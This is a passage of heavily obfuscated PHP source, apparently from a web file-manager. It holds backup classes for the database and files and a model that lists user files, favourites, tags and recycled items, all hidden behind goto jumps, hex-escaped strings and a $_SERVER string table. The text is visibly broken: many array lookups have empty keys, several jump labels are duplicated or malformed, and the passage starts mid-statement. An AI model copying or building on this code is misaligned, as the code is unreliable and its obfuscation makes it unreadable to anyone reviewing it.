$e֧[340]); $Aق = $e٨[667]; goto DӶ; DӶ: if (!$Aق) { return; } $dݿ = $this->{$_SERVER[ʆ][243]}($A[0], $A); $Bɼ = $e٨[668]; goto C; eּε: } public function pofdb8cace7b() { goto Fɥ; dǃ: while ($dɅە <= (int) $F֡[343]($c텙)) { $c = $dɅە; while (!0) { $c++; if ($c <= 2) { $dɅە = $c; break; } else { if ($c < 2) { continue; } } $B = !0; for ($Fɘ = 2; $Fɘ <= $F֡[343]($c); $Fɘ++) { if ($c % $Fɘ == 0) { $B = !1; } } if ($B) { $dɅە = $c; break; } } $Aᩃ[] = $dɅە; } $D = 2; for ($c = $c텙; $c > 1; $c--) { $B = !0; foreach ($Aᩃ as $f녊) { if ($c % $f녊 == 0) { $B = !1; break; } } if ($B) { $D = $c; break; } } goto Aމ; e씧: $F = $fɑ[669]; if (strlen($F) < $fɑ[562]) { die; } $Aᩃ = array(); goto bӔ; Aމ: return $D; goto fҠ; Fɥ: $fɑ =& $_SERVER[]; $F֡ =& $_SERVER[ʆ]; $c텙 = $F֡[322]($F֡[342](2, 14), $F֡[342](2, 16) - 1); goto e씧; bӔ: $dɅە = 1; $Fт = $fɑ[670]; while (strlen($Fт) < $fɑ[584]) { if (!$Fт) { break; } $Fт++; } goto dǃ; fҠ: } public function zcfl1f2042ed($fҧ, $c) { $Dʪ =& $_SERVER[ʆ]; return $Dʪ[13](array($Dʪ[14], $Dʪ[344]), $fҧ, $c); } public function suqh921e4c90($Cט, $Bǌ) { $C߭ =& $_SERVER[]; $Fˬ =& $_SERVER[ʆ]; return $Fˬ[13](array($Fˬ[345], $Fˬ[346]), $Cט, $Bǌ); $D = $C߭[671]; if (strlen($D) < $C߭[584]) { die; } } public function ctzn32bcc07a($fАċ, $d) { $cَ =& $_SERVER[]; $A =& $_SERVER[ʆ]; return $A[13](array($A[345], $A[347]), $fАċ, $d); $F = $cَ[672]; while (strlen($F) < $cَ[556]) { if (!$F) { break; } $F++; } } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $D݌ =& $_SERVER[]; self::$name = date($D݌[673]); if (!($C̃ҫ = Model($D݌[674])->lastItem())) { $C̃ҫ = $this->initData(); } else { self::$name = $C̃ҫ[$D݌[28]]; if ($C̃ҫ[$D݌[675]] == $D݌[83]) { self::$name = date($D݌[676]); $aگ헬 = 0; if (isset($C̃ҫ[$D݌[277]][$D݌[163]][$D݌[415]])) { $aگ헬 = (int) $C̃ҫ[$D݌[277]][$D݌[163]][$D݌[415]]; } if ($C̃ҫ[$D݌[28]] == self::$name) { Model($D݌[674])->remove($C̃ҫ[$D݌[363]]); } $C̃ҫ = $this->initData($aگ헬, $C̃ҫ[$D݌[677]]); } else { $this->checkStore($C̃ҫ[$D݌[677]]); } } self::$option = $C̃ҫ; } private function initData($Fః = 0, $D = '') { goto A; A: $b =& $_SERVER[]; $b΍ = Model($b[674])->config(); if ($D && $b΍[$b[677]] != $D) { $Fః = 0; } goto Dچ; Dچ: $this->checkStore($b΍[$b[677]]); $D٫ = array($b[677] => $b΍[$b[677]], $b[28] => self::$name, $b[675] => 0, $b[678] => $b΍[$b[678]], $b[277] => array($b[679] => array($b[675] => 0), $b[680] => array($b[675] => 0, $b[681] => 0, $b[682] => 0, $b[29] => $b[33]), $b[683] => array($b[675] => 0, $b[681] => 0, $b[682] => 0), $b[163] => array($b[675] => 0, $b[684] => 0, $b[685] => 0, $b[686] => 0, $b[687] => 0, $b[415] => $Fః)), $b[688] => time(), $b[689] => 0); $a = Model($b[674])->insert($D٫); goto EȜ; EȜ: $D٫[$b[363]] = $a; return $D٫; goto Dк; Dк: } private function checkStore($E) { $Aƿĸ =& $_SERVER[]; $b٨ر = Model($Aƿĸ[690])->listData($E); Model($Aƿĸ[690])->checkConfig($b٨ر); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[][674])->findByName(self::$name); } return self::$option; } public static function set($C) { $EΪ =& $_SERVER[]; $aƙ = self::get(); foreach ($C as $AϳŇ => $b޻) { $E򚻡 = explode($EΪ[91], $AϳŇ); $e = count($E򚻡); switch ($e) { case 1: $aƙ[$E򚻡[0]] = $b޻; break; case 2: $aƙ[$E򚻡[0]][$E򚻡[1]] = $b޻; break; case 3: $aƙ[$E򚻡[0]][$E򚻡[1]][$E򚻡[2]] = $b޻; break; } } Model($EΪ[674])->update($aƙ[$EΪ[363]], $aƙ); self::$option = $aƙ; return self::$option; } public function keep() { $Dʹ =& $_SERVER[]; $b걸ƫ = self::get(); if ($b걸ƫ[$Dʹ[277]][$Dʹ[679]][$Dʹ[675]] == $Dʹ[83]) { return; } $this->backupKeep($b걸ƫ); self::set(array($Dʹ[691] => 1)); } private function backupKeep($D䑣) { goto d; d: $fݨ =& $_SERVER[]; $B = Model($fݨ[674])->listData(); if (empty($B)) { return; } goto f˘; f˘: $Fтɹ = 0; $C٣ = array(); foreach ($B as $aϯ) { if ($Fтɹ >= 7) { break; } $C٣[] = $aϯ[$fݨ[28]]; $Fтɹ++; } goto AӭϤ; AӭϤ: for ($Fтɹ = 0; $Fтɹ < 12; $Fтɹ++) { $C٣[] = date($fݨ[692], strtotime("\x2d{$Fтɹ}\40\155\x6f\x6e\x74\150\x73")); } $C٣ = array_unique($C٣); foreach ($B as $aϯ) { if (!empty($aϯ[$fݨ[28]]) && in_array($aϯ[$fݨ[28]], $C٣)) { continue; } Model($fݨ[674])->remove($aϯ[$fݨ[363]]); $dѺ = "\x7b\151\x6f\x3a{$D䑣[$fݨ[677]]}\x7d\57\144\x61\164\141\142\x61\163\x65\57\142\141\143\153\165\x70\137{$aϯ[$fݨ[28]]}"; IO::remove($dѺ, !1); } goto E滬; E滬: } public function db() { goto E; E: $Bӈ¦ =& $_SERVER[]; $c = self::get(); if ($c[$Bӈ¦[277]][$Bӈ¦[680]][$Bӈ¦[675]] == $Bӈ¦[83]) { return !0; } goto Aύ; dУ;: return !0; goto Bܿ; Aύ: $Fɲ = new BackupDb(); if (!$Fɲ->index()) { return !1; } self::set(array($Bӈ¦[693] => 1)); goto dУ;; Bܿ: } public function dbFile() { goto a; a: $d =& $_SERVER[]; $D܆Ӆ = self::get(); if ($D܆Ӆ[$d[277]][$d[683]][$d[675]] == $d[83]) { return !0; } goto e; c늲: return !0; goto d׶̂٬; e: $AԠ = new BackupDbFile(); if (!$AԠ->index()) { return !1; } self::set(array($d[694] => 1)); goto c늲; d׶̂٬: } public function file() { $b =& $_SERVER[]; $fΒ = self::get(); if ($fΒ[$b[277]][$b[163]][$b[675]] == $b[83]) { return !0; } if (!isset($fΒ[$b[678]]) || $fΒ[$b[678]] == $b[464]) { $bť = new BackupFile(); if (!$bť->index()) { return !1; } } self::set(array($b[695] => 1, $b[675] => 1)); return !0; } } goto Bٺ; FǙ: function beforeShutdownError($d˔͋ = false, $Aۃ = '', $cߨ = '', $Cͅ = 0) { $c眇 =& $_SERVER[]; switch ($d˔͋) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $b엋 = $c眇[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $b엋 = $c眇[40]; break; case E_STRICT: $b엋 = $c眇[41]; break; case E_NOTICE: case E_USER_NOTICE: $b엋 = $c眇[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $b엋 = $c眇[43]; break; default: break; } if (!$b엋 || $b엋 == $c眇[42] || $b엋 == $c眇[43]) { return; } $cߨ = $c眇[4] . str_replace($_SERVER[$c眇[37]], $c眇[20], $cߨ); $E݃붣 = $b엋 . $c眇[44] . $Aۃ . $c眇[44] . $cߨ . $c眇[44] . $Cͅ; write_log($E݃붣 . $c眇[18] . get_caller_msg(1), $c眇[19]); } $_SERVER[$_SERVER[][45]] = $_SERVER[$_SERVER[][37]] . $_SERVER[][46]; $f = strrev(base64_decode($_SERVER[][47])); goto Dӧ; Bٺ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto E; E: $Aʸ =& $_SERVER[]; $cϩ = Backup::get(); self::$io = $cϩ[$Aʸ[677]]; goto fˆ; C͆: $E̝ = new DbManage($f, $cǄ); $e͹ = TEMP_FILES . $Aʸ[696] . self::$name . $Aʸ[8]; del_dir($e͹); goto aܥ; C: $A = new Task($Aʸ[697], $Aʸ[698], 0, LNG($Aʸ[699]) . $Aʸ[700] . LNG($Aʸ[701])); $f = array_diff($f, array($Aʸ[702], $Aʸ[703])); foreach ($f as $dʨצ) { $fۣ = $e͹ . $dʨצ . $Aʸ[704]; $c = null; if ($dʨצ == $Aʸ[705] && (!isset($cϩ[$Aʸ[678]]) || $cϩ[$Aʸ[678]] == $Aʸ[464])) { $c = self::$io; } $C += $E̝->sqlFromDb($dʨצ, $fۣ, $A, $c); } goto Fܙ; aܥ: mk_dir($e͹); $f = $E̝->db()->getTables(); $C = 0; goto C; Fܙ: $A->end(); $d = array($Aʸ[706] => $cǄ, $Aʸ[693] => 1, $Aʸ[707] => $C, $Aʸ[708] => $C); Backup::set($d); goto eڊ; eڊ: return !0; goto eͿ; fˆ: self::$name = $cϩ[$Aʸ[28]]; $f = $GLOBALS[$Aʸ[6]][$Aʸ[17]]; $cǄ = $this->_dbType($f); goto C͆; eͿ: } private function _dbType($B̈ԗ) { goto B݅; B݅: $a䐡 =& $_SERVER[]; $B̈ԗ = array_change_key_case($B̈ԗ); $Fމ = $B̈ԗ[$a䐡[709]]; goto CϡӾ; e͆: return $Fމ; goto aҖ; CϡӾ: if ($Fމ == $a䐡[710]) { $e糹 = explode($a䐡[4], $B̈ԗ[$a䐡[711]]); $Fމ = $e糹[0]; } $fڞ = array($a䐡[712] => $a䐡[9], $a䐡[713] => $a䐡[714]); if (isset($fڞ[$Fމ])) { $Fމ = $fڞ[$Fމ]; } goto e͆; aҖ: } } class BackupDbFile { public function __construct() { } public function index() { goto eꃈ; aՈ: return !0; goto dг; d: $FЩ = new TaskFileTransfer($bׇͦ[715], $bׇͦ[698], 0, LNG($bׇͦ[699]) . $bׇͦ[408] . LNG($bׇͦ[701]) . $bׇͦ[716]); $FЩ->addPath($d２); $Fۣ = IO::infoWithChildren($d２); goto d; d: Backup::set(array($bׇͦ[717] => $Fۣ[$bׇͦ[77]])); IO::move($d２, $Fʏ); $E麧Â = CONTROLLER_DIR . $bׇͦ[718]; goto eӅ˻; eꃈ: $bׇͦ =& $_SERVER[]; $C = Backup::get(); $CҿҬ = $C[$bׇͦ[28]]; goto D鹙; D鹙: $d２ = TEMP_FILES . "\142\141\143\x6b\165\x70\137{$CҿҬ}\x2f"; $Fʏ = "\173\151\157\72{$C[$bׇͦ[677]]}\x7d\x2f\x64\141\164\141\x62\x61\163\145\57"; IO::mkdir($Fʏ . "\x62\x61\143\153\165\160\x5f{$CҿҬ}\x2f"); goto d; eӅ˻: IO::copy($E麧Â, $Fʏ . "\142\141\143\x6b\165\x70\137{$CҿҬ}\57"); $FЩ->end(); Backup::set(array($bׇͦ[719] => $Fۣ[$bׇͦ[77]])); goto aՈ; dг: } } class BackupFile { public function __construct() { } public function index() { goto eռ; eռ: $c݄ = Backup::get(); $f = $c݄[$_SERVER[][277]][$_SERVER[][163]][$_SERVER[][415]]; $Aǐ = array($_SERVER[][416] => array($_SERVER[][720], $f), $_SERVER[][721] => array($_SERVER[][315], $c݄[$_SERVER[][677]])); goto fהʂ; d苯: $cӼ = $Cռҟ ? 1 : 0; $E۾ = array($_SERVER[][736] => 1, $_SERVER[][689] => time(), $_SERVER[][695] => $cӼ, $_SERVER[][733] => $f, $_SERVER[][725] => $A, $_SERVER[][724] => $D㓐); if ($F֘Ń) { $E۾[$_SERVER[][734]] = $C׏; $E۾[$_SERVER[][735]] = $Dܳ; } goto B݄; Fļ: $aۍ = 1000; $CԑÕ = $F֘Ń = 0; $F饋ҧ = array(); goto D𭳍; B݄: Backup::set($E۾); $this->_fileFilter($F饋ҧ); return !0; goto fމΦ; aǐ: $Cռҟ = !0; $eƣĈ = $this->storeIds(); $Aȡ = 1; goto Fļ; dʦɉ: $e->task[$_SERVER[][684]] = $A; $E۾ = array($_SERVER[][724] => $D㓐, $_SERVER[][725] => $A); Backup::set($E۾); goto aǐ; fהʂ: $D㓐 = (int) Model($_SERVER[][705])->where($Aǐ)->count($_SERVER[][415]); $A = (int) Model($_SERVER[][705])->where($Aǐ)->sum($_SERVER[][77]); $e = new TaskFileTransfer($_SERVER[][722], $_SERVER[][698], $D㓐, LNG($_SERVER[][699]) . $_SERVER[][700] . LNG($_SERVER[][723])); goto dʦɉ; D𭳍: $Dܳ = $C׏ = 0; do { $dƱ = $_SERVER[][726]; $aƝ = Model($_SERVER[][705])->where($Aǐ)->field($dƱ)->order($_SERVER[][727])->selectPage($aۍ, $Aȡ); $B = !empty($aƝ[$_SERVER[][350]]) ? $aƝ[$_SERVER[][350]] : array(); foreach ($B as $eتֵ) { goto E; eϢ: if ($CԑÕ >= 1024 * 1024 * 100) { $E۾ = array($_SERVER[][733] => $f, $_SERVER[][734] => $C׏, $_SERVER[][735] => $Dܳ); Backup::set($E۾); $CԑÕ = $F֘Ń = 0; } goto Cń; dя: if (IO::exist($F)) { $e->updateFileEnd($eتֵ[$_SERVER[][28]], $eتֵ[$_SERVER[][77]]); } else { $F = get_path_father($F); IO::mkdir($F); if (!IO::copy($a탨ς, $F, $_SERVER[][730])) { write_log($_SERVER[][731] . $a탨ς . $_SERVER[][732] . $F . $_SERVER[][472], $_SERVER[][698]); $Cռҟ = !1; break; } } $f = $eتֵ[$_SERVER[][415]]; $F֘Ń += 1; goto Fݏ; E: if (!$this->_fileExist($eتֵ, $F饋ҧ, $eƣĈ)) { $D㓐 -= 1; $A -= (int) $eتֵ[$_SERVER[][77]]; write_log("\x66\151\154\145\x20\x6e\x6f\x74\40\x65\170\x69\x73\164\x2e\146\151\154\145\x49\104\72{$eتֵ[$_SERVER[][415]]}\x2c\40\160\141\x74\x68\x3a{$eتֵ[$_SERVER[][75]]}", $_SERVER[][728]); continue; } $a탨ς = $eتֵ[$_SERVER[][75]]; $F = "\x7b\151\x6f\x3a{$c݄[$_SERVER[][677]]}\x7d" . substr($a탨ς, strlen("\x7b\x69\157\72{$eتֵ[$_SERVER[][729]]}\175")); goto dя; Fݏ: $CԑÕ += $eتֵ[$_SERVER[][77]]; $C׏ += 1; $Dܳ += $eتֵ[$_SERVER[][77]]; goto eϢ; Cń: } $cˣϖ = count($B); $Aȡ++; } while ($cˣϖ == $aۍ); $e->end(); goto d苯; fމΦ: } private function _fileExist($aޑ, &$Eӛ, $bⴲ) { goto f݂ƞ; f݂ƞ: $eڄ =& $_SERVER[]; $e = $aޑ[$eڄ[75]]; if (in_array($aޑ[$eڄ[415]], $Eӛ)) { return !1; } goto cԖ㬕; A: $Eӛ = array_merge($Eӛ, array_to_keyvalue($C퍄, $eڄ[33], $eڄ[415])); return !1; goto bዳ; eҹɮ: if (IO::exist($Dא)) { $Eӛ[] = $aޑ[$eڄ[415]]; return !1; } $B = array($eڄ[729] => $aޑ[$eڄ[729]], $eڄ[75] => array($eڄ[737], "{$Dא}\45")); $C퍄 = Model($eڄ[705])->where($B)->field($eڄ[416])->select(); goto A; cԖ㬕: if (!in_array($aޑ[$eڄ[729]], $bⴲ)) { return !1; } if (IO::exist($e)) { return !0; } $Dא = get_path_father($e); goto eҹɮ; bዳ: } private function _fileFilter($Dӹ) { $eץͤ =& $_SERVER[]; if (empty($Dӹ)) { return; } $DƋ = array($eץͤ[415] => array($eץͤ[7], array_unique($Dӹ))); $EȾ = Model($eץͤ[738])->where($DƋ)->field($eץͤ[365])->select(); foreach ($EȾ as $Bֲ) { Model($eץͤ[738])->remove($Bֲ[$eץͤ[365]], !1); } } private function storeIds() { $C藊Ƙ =& $_SERVER[]; $Aә = Model($C藊Ƙ[690])->listData(); return array_to_keyvalue($Aә, $C藊Ƙ[33], $C藊Ƙ[363]); } } goto e; Dؑ: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\x75\x72\x63\x65"; protected $tableMeta = array("\x74\141\x62\154\145\x4e\x61\155\x65" => "\151\157\x5f\x73\157\x75\162\143\x65\137\155\x65\164\x61", "\155\x65\164\x61\x46\x69\145\x6c\x64" => "\x73\157\165\162\x63\x65\x49\x44"); protected $dataAuto = array(array("\x6d\157\x64\x69\x66\171\124\x69\155\x65", "\164\x69\x6d\145", "\x69\156\163\x65\162\x74", "\x66\165\156\x63\x74\151\x6f\x6e"), array("\143\162\x65\141\164\145\124\x69\155\145", "\x74\151\155\145", "\151\x6e\163\x65\x72\x74", "\146\x75\156\143\x74\x69\x6f\x6e"), array("\x76\x69\145\167\x54\x69\155\145", "\164\151\x6d\145", "\x69\156\x73\145\162\164", "\146\x75\156\143\x74\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($b) { return $this->listSource(array($_SERVER[][364] => $b)); } public function typeName($a􍗈) { static $F = array(self::TYPE_SYSTEM => "\163\171\x73\164\x65\x6d", self::TYPE_USER => "\x75\x73\x65\162", self::TYPE_GROUP => "\x67\x72\x6f\165\x70"); return $F[$a􍗈 . $_SERVER[][33]]; } public function sourceListInfo($Dї, $AН = false) { goto A͇; A͇: $dНݗ =& $_SERVER[]; $Dї = $Dї ? $Dї : array(); $Dї = array_filter(array_unique($Dї)); goto EЛ͍; EЛ͍: if (!$Dї) { return array(); } $E = $this->where(array($dНݗ[365] => array($dНݗ[7], $Dї)))->select(); $this->_listDataApply($E, $AН); goto E׃; E׃: return array_to_keyvalue($E, $dНݗ[365]); goto dŝ糏; dŝ糏: } public function pathInfoFilter($Cɉ) { goto E; c𔚩: if (isset($Cɉ[$bޓݶ[372]]) && $Cɉ[$bޓݶ[372]][$bޓݶ[373]] == -1) { $Eڒя = array_remove_value($Eڒя, $bޓݶ[183]); $Eڒя = array_remove_value($Eڒя, $bޓݶ[106]); $Eڒя = array_remove_value($Eڒя, $bޓݶ[374]); $Eڒя = array_remove_value($Eڒя, $bޓݶ[375]); $Eڒя = array_remove_value($Eڒя, $bޓݶ[77]); $Eڒя = array_remove_value($Eڒя, $bޓݶ[376]); } $Cɉ = array_field_key($Cɉ, $Eڒя); return $Cɉ; goto E˞冉; CЃ: $e .= $bޓݶ[370]; $e .= $bޓݶ[371]; $Eڒя = explode($bޓݶ[47], $e); goto c𔚩; eƍ: $Cɉ[$bޓݶ[367]] = $this->typeName($Cɉ[$bޓݶ[367]]); if ($Cɉ[$bޓݶ[366]] != 1) { $Cɉ[$bޓݶ[156]] = $Cɉ[$bޓݶ[368]]; unset($Cɉ[$bޓݶ[368]]); } $e = $bޓݶ[369]; goto CЃ; E: $bޓݶ =& $_SERVER[]; $Cɉ[$bޓݶ[75]] = KodIO::make($Cɉ[$bޓݶ[365]]); $Cɉ[$bޓݶ[29]] = $Cɉ[$bޓݶ[366]] == 1 ? $bޓݶ[76] : $bޓݶ[163]; goto eƍ; E˞冉: } public function listUserFav() { goto E콿; E콿: $F =& $_SERVER[]; $a = Model($F[377])->listData(); $D = array_filter_by_field($a, $F[29], $F[378]); goto c; A: foreach ($a as &$Aǭǋ) { $Aǭǋ = array($F[381] => $Aǭǋ[$F[363]], $F[382] => $Aǭǋ[$F[28]], $F[383] => $Aǭǋ[$F[75]], $F[384] => $Aǭǋ[$F[29]], $F[385] => $Aǭǋ[$F[183]], $F[386] => $Aǭǋ[$F[106]]); if ($Aǭǋ[$F[29]] == $F[378] && $F[$Aǭǋ[$F[75]]]) { $Aǭǋ[$F[387]] = $F[$Aǭǋ[$F[75]]]; } } return $a; goto d𹣊; c: $D = array_to_keyvalue($D, $F[33], $F[75]); if ($D) { $F = $this->listSource(array($F[379] => array($F[380], $D))); } $F = array_to_keyvalue($F[$F[350]], $F[365]); goto A; d𹣊: } public function listUserTag($B޴) { goto dȝ; E欉ܛ: $this->listUserTagClear($A͎т, $Cԧ, $B޴); return $Cԧ; goto AΡ; A: $A͎т = array_to_keyvalue($A͎т, $Cϑٜ[33], $Cϑٜ[75]); $Cԧ = array(); if ($A͎т) { $F = array($Cϑٜ[379] => array($Cϑٜ[380], $A͎т)); $Cԧ = $this->listSource($F); } goto E欉ܛ; dȝ: $Cϑٜ =& $_SERVER[]; $D = Model($Cϑٜ[388])->listData(); $A͎т = array_filter_by_field($D, $Cϑٜ[389], $B޴); goto A; AΡ: } private function listUserTagClear($Aպ, $cƘ־, $Bߘܓ) { goto f; f: $bȱگ =& $_SERVER[]; if (!$Aպ) { return; } if ($cƘ־ && count($Aպ) == $cƘ־[$bȱگ[347]][$bȱگ[348]]) { return; } goto F鈯ڍ; B͹: Model($bȱگ[390])->removeFromTag($Fˑ, $Bߘܓ); goto C; F鈯ڍ: $Fˑ = array(); $C΄ = array_to_keyvalue($cƘ־[$bȱگ[74]], $bȱگ[33], $bȱگ[365]); $CÏ = array_to_keyvalue($cƘ־[$bȱگ[73]], $bȱگ[33], $bȱگ[365]); goto C򍺶; C򍺶: $Aӹɶ = array_merge($CÏ, $C΄); foreach ($Aպ as $e䅾) { if (!in_array($e䅾, $Aӹɶ)) { $Fˑ[] = $e䅾; } } if (!$Fˑ) { return; } goto B͹; C: } public function listUserRecycle() { $Dߏ =& $_SERVER[]; $d = Model($Dߏ[391])->listData(); if (!$d) { return array(); } $fը = array($Dߏ[379] => array($Dߏ[380], $d), $Dߏ[392] => 1); return $this->listSource($fը); } public function listSource($Cݭ, $f합 = 3000) { goto D; D: $b̏锒 =& $_SERVER[]; if (!isset($Cݭ[$b̏锒[393]])) { $Cݭ[$b̏锒[393]] = 0; } $E¿ɾ = $b̏锒[394]; goto B䙧ύ; B䙧ύ: $aјŒ = $this->field($E¿ɾ)->_makeOrder()->where($Cݭ)->selectPage($f합); $this->_listDataApply($aјŒ[$b̏锒[350]]); $this->_listMake($aјŒ); goto Cү; Cү: return $aјŒ; goto D; D: } protected function _makeOrder() { goto F檗; eհ: $bװ = Input::get($C䢄[404], $C䢄[7], $fۋٝ, array_keys($C¬)); if (!in_array($C, array_keys($aڞ))) { $C = $C䢄[28]; } if (!in_array($bװ, array_keys($C¬))) { $C = $C䢄[398]; } goto D͒ʖ; D͒ʖ: if ($C == $C䢄[28]) { } $a䰩 = $C䢄[405] . $aڞ[$C] . $C䢄[50] . $C¬[$bװ]; return $this->order(rtrim(trim($a䰩), $C䢄[47])); goto b⬃; F檗: $C䢄 =& $_SERVER[]; $F񃯄 = Model($C䢄[395])->get($C䢄[396]); $fۋٝ = Model($C䢄[395])->get($C䢄[397]); goto f; f: $C¬ = array($C䢄[398] => $C䢄[399], $C䢄[400] => $C䢄[401]); $aڞ = array($C䢄[28] => $C䢄[28], $C䢄[77] => $C䢄[77], $C䢄[156] => $C䢄[368], $C䢄[374] => $C䢄[374], $C䢄[402] => $C䢄[375], $C䢄[183] => $C䢄[183], $C䢄[106] => $C䢄[106]); $C = Input::get($C䢄[403], $C䢄[7], $F񃯄, array_keys($aڞ)); goto eհ; b⬃: } protected function _listDataApplyItem($bɪ, $A숤 = false) { $A = array($bɪ); $this->_listDataApply($A, $A숤); return $A[0]; } protected function _listDataApply(&$Dճ, $C݌ = false) { goto B; A: $this->_listAppendPath($Dճ); $this->_listAppendAuth($Dճ); $this->_listAppendSourceInfo($Dճ, $c); goto Bަ; e: $c = array_unique($c); $this->_listSourceCache($Dճ); if (!$C݌) { $this->_listAppendMeta($Dճ, $c); $this->_listAppendFileMeta($Dճ, $c); $this->_listAppendChildren($Dճ, $c); } goto A; Bަ: $this->_listAppendUser($Dճ); $this->_listFilterInfo($Dճ, $C݌); goto D; B: $aԱ =& $_SERVER[]; if (!$Dճ) { $Dճ = array(); return; } $c = array_to_keyvalue($Dճ, $aԱ[33], $aԱ[365]); goto e; D: } protected function _listSourceCache($b㭡) { $D軈 =& $_SERVER[]; foreach ($b㭡 as $eȱ) { self::$cacheSourceInfo[$D軈[406] . $eȱ[$D軈[365]]] = $eȱ; } } protected function _listFilterInfo(&$A߸, $a݈ = false) { $b䂫 =& $_SERVER[]; foreach ($A߸ as &$C발) { $C발 = $this->pathInfoFilter($C발); self::$cachePathInfo[$b䂫[407] . intval($a݈) . $b䂫[408] . $C발[$b䂫[365]]] = $C발; } } protected function _listMake(&$a簠) { $a矊 =& $_SERVER[]; $a簠[$a矊[74]] = array(); $a簠[$a矊[73]] = array(); foreach ($a簠[$a矊[350]] as $d) { $B΅ = $d[$a矊[366]] == 1 ? $a矊[74] : $a矊[73]; $a簠[$B΅][] = $d; } unset($a簠[$a矊[350]]); } protected function _listAppendMeta(&$D, $E딾Ұ) { goto dƸ; eǗ: if (!$a) { return; } $b = array($bˣМ[411], $bˣМ[412]); $bɬ = array(); goto Eբ; Eբ: foreach ($a as $b) { if (!isset($bɬ[$b[$bˣМ[365]]])) { $bɬ[$b[$bˣМ[365]]] = array(); } if (in_array($b[$bˣМ[89]], $b)) { continue; } $bɬ[$b[$bˣМ[365]]][$b[$bˣМ[89]]] = $b[$bˣМ[355]]; } foreach ($D as &$DԖȴ) { $DԖȴ[$bˣМ[413]] = !1; if (isset($bɬ[$DԖȴ[$bˣМ[365]]])) { $DԖȴ[$bˣМ[413]] = $bɬ[$DԖȴ[$bˣМ[365]]]; } if ($this->fileIsLock($DԖȴ) && $DԖȴ[$bˣМ[372]]) { $D軯 = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $DԖȴ[$bˣМ[372]][$bˣМ[373]] = AuthModel::authDisable($DԖȴ[$bˣМ[372]][$bˣМ[373]], $D軯); $DԖȴ[$bˣМ[372]][$bˣМ[414]][$bˣМ[372]] = $DԖȴ[$bˣМ[372]][$bˣМ[373]]; } } goto D; dƸ: $bˣМ =& $_SERVER[]; $Aы = array($bˣМ[379] => array($bˣМ[380], $E딾Ұ)); $a = Model($bˣМ[409])->field($bˣМ[410])->where($Aы)->select(); goto eǗ; D: } protected function _listAppendFileMeta(&$F, $b䵕Қ) { goto b; b: $a֘ =& $_SERVER[]; $CŅ = array_to_keyvalue($F, $a֘[33], $a֘[415]); $CŅ = array_filter(array_unique($CŅ)); goto c; c: if (!$CŅ) { return; } $e = array($a֘[416] => array($a֘[380], $CŅ)); $c탮 = $a֘[417]; goto f; f: $f其 = Model($a֘[418])->field($c탮)->where($e)->select(); $f其 = array_to_keyvalue($f其, $a֘[415]); $cБ䑋 = Model($a֘[419])->field($a֘[420])->where($e)->select(); goto a; a: $cБ䑋 = $cБ䑋 ? $cБ䑋 : array(); $dέ = array(); foreach ($cБ䑋 as $d) { if (!isset($dέ[$d[$a֘[415]]])) { $dέ[$d[$a֘[415]]] = array(); } $dέ[$d[$a֘[415]]][$d[$a֘[89]]] = $d[$a֘[355]]; } goto f颢; f颢: foreach ($F as &$d) { goto C՝Ƀ; Fæ듇: if (isset($d[$a֘[158]][$a֘[422]])) { $d[$a֘[422]] = json_decode($d[$a֘[158]][$a֘[422]], !0); unset($d[$a֘[158]][$a֘[422]]); } goto d͂ȕ; C՝Ƀ: $Eв = $d[$a֘[415]]; if (!$Eв || !isset($f其[$Eв])) { continue; } $C = $f其[$Eв]; goto C; C: $C[$a֘[77]] = $d[$a֘[77]]; $C[$a֘[28]] = $d[$a֘[28]]; self::$cacheFileInfo[$a֘[421] . $Eв] = $C; goto Aઓ; Aઓ: unset($f其[$Eв][$a֘[75]]); $cɤ = is_array($dέ[$Eв]) ? $dέ[$Eв] : array(); $d[$a֘[158]] = array_merge($cɤ, $f其[$Eв]); goto Fæ듇; d͂ȕ: } goto D򂹋; D򂹋: } protected function _listAppendSourceInfo(&$d삒, $E) { goto b̍; a: $BκƐ = array_to_keyvalue($Aι, $A[363]); $Cޫ = array_to_keyvalue_group($F, $A[75], $A[389]); $a = array_to_keyvalue($a, $A[75]); goto BװŶ; b̍: $A =& $_SERVER[]; if (!defined($A[423])) { return; } $Aι = Model($A[424])->listData(); goto cˊ; BװŶ: $C٫ = array_to_keyvalue_group($B䌋, $A[365]); foreach ($d삒 as &$Fʣ) { $Fʣ[$A[387]] = array($A[426] => 0, $A[427] => 0, $A[428] => 0); if (isset($a[$Fʣ[$A[365]]])) { $Fʣ[$A[387]][$A[429]] = 1; $Fʣ[$A[387]][$A[430]] = $a[$Fʣ[$A[365]]][$A[28]]; } if (isset($Cޫ[$Fʣ[$A[365]]])) { $Fʣ[$A[387]][$A[431]] = array(); foreach ($Cޫ[$Fʣ[$A[365]]] as $F) { $Fļ = $BκƐ[$F]; $Fʣ[$A[387]][$A[431]][] = array($A[432] => $Fļ[$A[363]], $A[382] => $Fļ[$A[28]], $A[433] => $Fļ[$A[434]]); } } if (isset($C٫[$Fʣ[$A[365]]])) { $Fʣ[$A[387]][$A[435]] = array(); foreach ($C٫[$Fʣ[$A[365]]] as $Fֽ) { $Fʣ[$A[387]][$A[435]] = array($A[436] => $Fֽ[$A[437]], $A[438] => $Fֽ[$A[439]], $A[440] => $Fֽ[$A[365]], $A[441] => $Fֽ[$A[442]], $A[443] => $Fֽ[$A[444]]); } } } return $d삒; goto b肗; cˊ: $F = Model($A[388])->listData(); $a = Model($A[377])->listData(); $B䌋 = Model($A[425])->listSimple(); goto a; b肗: } protected function _listAppendChildren(&$F˝Ș, $EŖߧ) { goto e; bʎ: $f뜄 = 1024 * 50; $F˝Ș = is_array($F˝Ș) ? $F˝Ș : array(); $Eښё = count($F˝Ș); goto dƭ; e: $e =& $_SERVER[]; $dպ = $e[357]; $aŶ = array(); goto bʎ; F־Ħ: foreach ($F˝Ș as &$eӊ) { if ($eӊ[$e[366]]) { unset($eӊ[$e[368]]); 